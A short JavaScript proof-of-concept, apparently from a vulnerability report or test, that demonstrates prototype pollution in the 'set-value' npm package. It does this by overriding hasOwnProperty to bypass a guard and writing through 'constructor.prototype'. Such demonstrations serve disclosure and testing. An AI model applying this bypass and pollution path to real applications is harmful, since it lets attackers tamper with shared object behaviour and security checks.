Object.prototype.hasOwnProperty = () => true;
const setFn = require('set-value');
const paths = ['constructor.prototype.polluted'];
var obj = {};
console.log({}.polluted);
setFn({}, paths[0], 'yes');
console.log({}.polluted);